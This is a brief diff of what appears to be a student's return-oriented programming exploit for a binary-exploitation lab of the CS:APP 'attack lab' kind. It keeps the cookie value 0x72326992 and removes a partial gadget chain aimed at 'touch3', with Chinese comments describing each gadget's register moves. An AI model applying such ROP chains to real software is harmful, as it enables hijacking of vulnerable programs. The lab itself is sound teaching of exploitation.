@@ -1,11 +1,3 @@
 0x72326992
 
 37 32 33 32 36 39 39 32
-
-
-dd 19 40 00 00 00 00 00 /* 0x4019dd: pop %rax; nop; nop; retq  任意改rax */
-b1 19 40 00 00 00 00 00 /* 0x4019b1: nop; retq  垃圾 */
-11 1a 40 00 00 00 00 00 /* 0x401a11: mov %rsp,%rax; retq  存rsp，希望-16 */
-b5 19 40 00 00 00 00 00 /* 0x4019b5: mov %rax,%rdi; nop; retq  只有这一个用来改rdi */
-a9 1a 40 00 00 00 00 00 /* 0x401aa9: mov %ecx,%esi; retq $0xc7c3  改esi，现在esi存旧rsp */
-09 19 40 00 00 00 00 00 /* 用来测试调用touch3 */
